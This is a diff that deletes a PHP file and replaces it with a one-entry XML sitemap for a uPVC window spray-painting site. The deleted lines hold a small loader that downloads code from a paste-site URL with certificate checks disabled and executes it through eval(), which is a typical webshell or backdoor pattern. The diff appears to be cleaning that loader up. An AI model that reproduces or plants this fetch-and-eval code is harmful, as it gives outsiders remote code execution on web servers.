@@ -1,22 +1,8 @@
-<?php
-
-
-function getURL($url) {
-    
-    if(function_exists('curl_version')) {
-        
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-}
-
-
-eval("?>" . getURL("https://pastee.dev/r/4Q0V43S4/0"));
-
-?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!--   created with Free Online Sitemap Generator www.xml-sitemaps.com   -->
+<url>
+<loc>https://upvcspraypainters.com/upvc-window-spray-painting/</loc>
+<lastmod>2026-03-19T09:02:35+00:00</lastmod>
+<priority>1.00</priority>
+</url>
+</urlset> 
